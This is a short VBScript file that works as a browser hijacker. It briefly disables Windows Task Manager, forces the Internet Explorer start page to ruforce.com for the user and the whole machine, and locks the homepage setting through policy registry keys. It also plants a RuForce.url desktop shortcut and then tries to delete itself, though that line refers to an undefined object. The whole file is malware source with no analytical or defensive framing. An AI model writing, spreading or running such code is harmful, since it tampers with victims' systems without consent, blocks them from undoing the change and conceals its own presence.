sub good
On Error Resume Next
Set WshShell = WScript.CreateObject("WScript.Shell")
set fs=createobject("Scripting.FileSystemObject")
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD" 
Wscript.sleep(30000)
WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.ruforce.com"
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.ruforce.com"
WshShell.RegWrite "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
WshShell.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
desktop = WshShell.SpecialFolders("Desktop")
set url=fs.CreateTextFile(desktop & "\RuForce.url")
url.WriteLine "[InternetShortcut]"
url.WriteLine "URL=http://www.ruforce.com/"
url.close
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD"
f.deletefile WScript.ScriptFullName, true
end sub
good